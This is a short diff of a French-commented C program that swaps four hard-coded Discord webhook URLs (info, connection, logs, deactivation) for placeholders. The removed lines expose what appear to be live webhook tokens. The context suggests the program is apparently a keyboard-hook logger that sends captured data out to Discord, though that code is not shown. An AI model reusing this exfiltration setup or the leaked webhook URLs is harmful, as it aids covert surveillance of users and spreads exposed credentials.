@@ -27,10 +27,10 @@
 #pragma comment(lib, "ole32.lib")
 
 // Définition des URLs des webhooks Discord
-#define WEBHOOK_INFO "https://discord.com/api/webhooks/1448696062712742008/jjz28SM9OSS92kNIqbsPWNrgU8gAckrfUr8IEYLNGC-Sn05K-B4mJyPNWrsvbshZa9ta"
-#define WEBHOOK_CONNEXION "https://discord.com/api/webhooks/1448695663482110185/dDCd-1uyLTEnYYl0Jd_lXY069KWYhtpiWQ8kInhSpDSGiw51mUwRU8dsR5D78yuUVjcv"
-#define WEBHOOK_LOGS "https://discord.com/api/webhooks/1448696214039298282/4gaIpQcGxaV9TFKTE87Rv5xyiAX8BK57ilyDGwJrQfaA-BTe0QPXLtWWmp7rzfBKeqPn"
-#define WEBHOOK_DESACTIVATION "https://discord.com/api/webhooks/1448696329638252555/hEkAFauhYSk6Lg44-3JE_S0R5Hoqu5hha-iPQah6zBMGAIovB0hxQ7IEXpjVUDxwNdUL"
+#define WEBHOOK_INFO "<YOUR_WEBHOOK_URL_HERE>"
+#define WEBHOOK_CONNEXION "<YOUR_WEBHOOK_URL_HERE>"
+#define WEBHOOK_LOGS "<YOUR_WEBHOOK_URL_HERE>"
+#define WEBHOOK_DESACTIVATION "<YOUR_WEBHOOK_URL_HERE>"
 
 // Définitions pour le comportement du programme
 #define visible
@@ -647,4 +647,5 @@ int main() {
     ReleaseHook();
     CoUninitialize();
     return 0;
+
 }
